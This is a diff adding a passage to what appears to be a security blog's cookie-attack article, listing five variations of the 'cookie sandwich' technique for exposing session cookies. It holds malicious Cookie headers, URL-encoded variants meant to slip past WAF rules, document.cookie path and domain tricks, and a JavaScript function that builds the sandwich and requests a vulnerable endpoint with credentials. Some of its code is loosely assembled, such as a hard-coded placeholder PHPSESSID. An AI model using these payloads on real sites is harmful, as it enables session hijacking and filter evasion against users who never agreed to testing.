@@ -174,4 +174,100 @@ Cookies
 XSS
 Zakhar Favourites
 
-Back to all articles
+
+##
+##
+##
+##
+
+
+# 1. Multiple Layer Sandwiches
+Concept:
+Instead of a single “bread” of $Version and two sandwich cookies, you can stack multiple layers of cookie segments. This can allow you to exfiltrate multiple sensitive cookies in a single shot.
+
+#Example Variation:
+Layer 1 (Outer): Use $Version=1 to force legacy parsing.
+Layer 2 (Middle): Inject a cookie (e.g., session="start;) where sensitive cookies will be embedded.
+Layer 3 (Inner): Insert another cookie that holds a different sensitive value (e.g., authToken=secretValue;).
+Layer 4 (Closure): Append the closing segment with another cookie, such as dummy=end".
+Malicious Request Header:
+
+bash
+Copy
+Cookie: $Version=1; session="start; authToken=secretValue; dummy=end"
+Rationale: This approach may work if the backend concatenates or reflects the full cookie string. By carefully choosing the segment boundaries, you could force multiple cookies into the same parameter or even split them across different application variables.
+
+2. Using Alternative Quote Escapes
+Concept:
+Experiment with different escape mechanisms for quotes or semicolons. Although most modern frameworks will unescape \" or \073 (for semicolon), testing alternate escape sequences might work if the target application uses a non-standard parser or has misconfigured decoding.
+
+Example Variation:
+Instead of using literal quotes (") and semicolons (;), try using their octal or hexadecimal encodings.
+Malicious Request Header:
+
+```
+Cookie: $Version=1; session=%22start%3B authToken=secretValue%3B dummy=end%22
+```
+
+
+Here, %22 represents a double quote and %3B a semicolon in URL-encoded form. This variation may bypass certain WAF rules or trigger different parser behaviors.
+
+3. Path and Domain Manipulation
+Concept:
+Since cookie order is influenced by the cookie’s scope (path and domain), you can experiment with different attribute values to force the target cookie to be parsed in a predictable order.
+
+Example Variation:
+Set a long path: Create your sandwich cookies with a more specific (and longer) path attribute than the target sensitive cookie.
+Domain matching: Use a domain attribute that matches or is a subdomain of the target cookie’s domain to alter the order.
+Malicious JavaScript Example:
+
+```
+document.cookie = "$Version=1; path=/api/secure;";
+document.cookie = "session=\"start; path=/api/secure;";
+document.cookie = "PHPSESSID=secret; path=/;";
+document.cookie = "dummy=end\"; path=/;";
+```
+
+Rationale: In this setup, because the cookies with the /api/secure path are more specific than those with /, they are sent first. This can force the target cookie (PHPSESSID) to be sandwiched in the middle, where it might be reflected by a vulnerable endpoint.
+
+4. Combining with Other Cookie Manipulation Attacks
+Concept:
+You could combine the cookie sandwich with other techniques such as cookie smuggling or splitting. For example, using malformed cookies or cookie name collisions might trigger edge-case parsing bugs in certain frameworks.
+
+Example Variation:
+Cookie name collisions: Create two cookies with similar names, one using a legacy prefix (e.g., $Version) and one without, to see if the application merges them incorrectly.
+Malicious Request Header:
+
+Cookie: $Version=1; session="start; $session=maliciousValue; dummy=end"
+Rationale: If the backend merges or splits cookie values based on naming conventions, you might be able to get the sensitive data (PHPSESSID or another session identifier) to appear in an unintended place in the application’s output or logging.
+
+# 5. Dynamic Sandwich via Client-Side Scripting
+Concept:
+Rather than using static values, dynamically generate the cookie sandwich in the browser. This approach can help bypass certain WAF or CSP restrictions that look for static malicious patterns.
+
+Example Variation (JavaScript):
+
+```
+function createCookieSandwich(target, sensitiveCookieName) {
+    const domain = new URL(target).hostname;
+    // Create the legacy cookie to force RFC2109 parsing.
+    document.cookie = `$Version=1; domain=${domain}; path=/;`;
+    // Insert the first half of the sandwich.
+    document.cookie = `${sensitiveCookieName}="start; domain=${domain}; path=/secure;`;
+    // Append the sensitive cookie (if accessible or injected via XSS).
+    // Note: In a real scenario, this might be pre-populated by the victim's browser.
+    document.cookie = `PHPSESSID=secret; domain=${domain}; path=/;`;
+    // Close the sandwich.
+    document.cookie = `dummy=end"; domain=${domain}; path=/;`;
+    
+    // Trigger a request to the vulnerable endpoint.
+    fetch(target, { credentials: 'include' })
+      .then(response => response.text())
+      .then(text => console.log("Response:", text))
+      .catch(err => console.error(err));
+}
+
+
+// Example usage:
+createCookieSandwich("https://vulnerable.example.com/json", "session");
+Rationale: Dynamically constructing the sandwich can allow for more tailored attacks based on runtime conditions. It can also be used to circumvent filtering that might detect static attack payloads.
